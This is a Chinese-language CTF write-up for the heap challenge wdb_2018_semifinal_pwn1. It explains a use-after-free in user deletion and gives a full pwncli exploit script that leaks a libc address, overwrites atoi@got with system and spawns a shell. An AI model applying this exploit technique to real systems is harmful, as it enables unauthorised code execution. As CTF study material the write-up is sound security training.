# wdb_2018_semifinal_pwn1



### 总结

其实就是很简单的`UAF`的题目，只是结构体和分支比较复杂一点，所以逆向难度增加了。利用其实很简单。

<!-- more -->

### 题目分析

#### checksec

![image-20210912175508671](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912175508671.png)

远程环境为`libc-2.23-so`。

#### 结构体

主要涉及到两个结构体。一个是玩家信息的结构体：

```c
struct __attribute__((aligned(8))) User
{
  char *name;
  uint64_t age;
  char descripe[256];
  Message *msg_ptr;
  User *friend;
  uint64_t status;
};
```

一个是消息的结构体：

```c
struct Message
{
  char *title;
  char *content;
  char *next_message;
};
```

#### 漏洞点

在`manager_friend`的分支，可以删除任意用户。但是删除该用户后，还能用该用户登录。

![image-20210912175746614](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912175746614.png)

### 利用思路

- 注册两个用户`user1`和`user2`
- `user1`登录，然后添加`user2`为朋友，然后删除`user2`这个朋友
- 注册`0x401816`的用户，这样`user2`的名字就成了`Done!`，并且可以登录
- 登录`user2`，查看`profile`即可泄露出`main_arena+88`的地址
- 然后登录`0x401816`用户，修改`username`为`atoi@got`
- 再登录`atoi_addr`用户，然后`update`，修改`atoi@got`为`system`地址，再输入`/bin/sh`即可拿到`shell`

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def register(name_size:int, name:(str, bytes), age:int, desc:(str, bytes)="a"):
    p.sendlineafter("Your choice:", "2")
    p.sendlineafter("Input your name size:", str(name_size))
    p.sendafter("Input your name:", name)
    p.sendlineafter("Input your age:", str(age))
    if age > 17:
        p.sendafter("Input your description:", desc)


def login(user_name:(str, bytes)):
    p.sendlineafter("Your choice:", "1")
    p.sendafter("Please input your user name:", user_name)
    msg = p.recvline()
    info("Msg recv: {}".format(msg))
    return msg


def view_profile():
    p.sendlineafter("Your choice:", "1")
    msg = p.recvlines(3)
    info("Msg recv: {}".format(msg))
    return msg


def update_profile(user_name:(str, bytes), age:int, desc:(str, bytes)):
    p.sendlineafter("Your choice:", "2")
    p.sendafter("Input your name:", user_name)
    p.sendlineafter("Input your age:", str(age))
    p.sendafter("Input your description:", desc)


def add_delete_friend(add_delete:str, friend_name:(str, bytes)):
    p.sendlineafter("Your choice:", "3")
    p.sendafter("Input the friend's name:", friend_name)
    p.sendlineafter("So..Do u want to add or delete this friend?(a/d)", add_delete)


def send_message(friend_name:(str, bytes), title:(str, bytes), content:(str, bytes)):
    p.sendlineafter("Your choice:", "4")
    p.sendafter("Which user do you want to send a msg to:", friend_name)
    p.sendafter("Input your message title:", title)
    p.sendafter("Input your content:", content)


def view_message():
    p.sendlineafter("Your choice:", "5")
    msg = p.recvuntil("1.view profile\n")
    info("Msg recv: {}".format(msg))
    return msg

def logout():
    p.sendlineafter("Your choice:", "6")


register(0x10, "user1", 16)
register(0x10, "user2", 16)


login("user1\x00")
add_delete_friend('a', "user2\x00")

add_delete_friend('d', "user2\x00")

logout()
register(0x128, p64(0x401816), 16)

# stop()
login("Done!" + "\x00")
_, leak_addr, _1 = view_profile()

libc_base_addr = int16(leak_addr[4:].decode()) - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

logout()

login(p64(0x401816))
update_profile(p64(0x602060), 123, "deadbeef")
logout()

login(p64(libc_base_addr + libc.sym['atoi']))

p.sendlineafter("Your choice:", "2")
p.sendafter("Input your name:", p64(libc_base_addr + libc.sym['system']))
p.sendafter("Input your description:", "/bin/sh\x00")
p.sendline("/bin/sh\x00")

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-09-12-wdb-2018-semifinal-pwn1/  

